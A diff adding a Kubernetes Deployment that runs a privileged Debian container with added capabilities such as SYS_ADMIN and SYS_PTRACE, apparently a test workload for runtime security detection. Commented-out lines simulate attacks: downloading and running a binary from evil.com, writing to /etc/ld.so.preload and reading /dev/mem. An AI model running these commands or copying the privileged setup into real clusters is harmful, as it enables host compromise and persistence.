@@ -1,0 +1,63 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: app-c
+  namespace: team-green
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: app-c
+  template:
+    metadata:
+      labels:
+        app: app-c
+    spec:
+      #nodeSelector:
+        #node: node01
+      #  kubernetes.io/hostname: k8s-node01 # a revoir avec le nom du cluster
+      #hostPID: true
+      #hostNetwork: true
+      containers:
+      - name: app
+        image: debian:bookworm-slim
+        securityContext:
+          readOnlyRootFilesystem: false
+          privileged: true
+          capabilities:
+            add: 
+              - SYS_RAWIO
+              - SYS_ADMIN
+              - SYS_PTRACE
+              - KILL
+              - SYS_BOOT
+        command:
+          - sh
+          - -c
+          - |
+            apt update && apt install -y strace
+            mkdir -p /mnt/test
+            while true; do
+              strace ls 
+              
+                           
+              # echo -e '\x7fELF....' > /tmp/malware
+              # chmod +x /tmp/malware
+ 
+              # wget http://evil.com/malware -O /tmp/x
+              # chmod +x /tmp/x
+              # /tmp/x
+
+              # echo 1 > /proc/sys/kernel/randomize_va_space
+
+              
+              # dd if=/dev/mem of=/dev/null bs=1 count=1
+
+              #echo "/tmp/libmalicious.so" >> /etc/ld.so.preload
+
+              sleep 10
+            done
+
+
+
+
